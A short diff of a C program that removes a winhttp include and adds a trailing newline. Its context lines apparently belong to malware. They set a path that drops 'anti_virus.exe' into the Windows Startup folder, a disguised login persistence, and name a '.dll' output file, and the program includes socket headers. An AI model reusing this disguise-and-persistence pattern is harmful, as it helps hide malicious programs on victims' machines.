@@ -10,7 +10,6 @@ const char *output_file_dir = ".dll"; //text.txt
 const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anti_virus.exe";
 
 #include <winsock2.h>
-#include <winhttp.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
@@ -170,3 +169,4 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
+
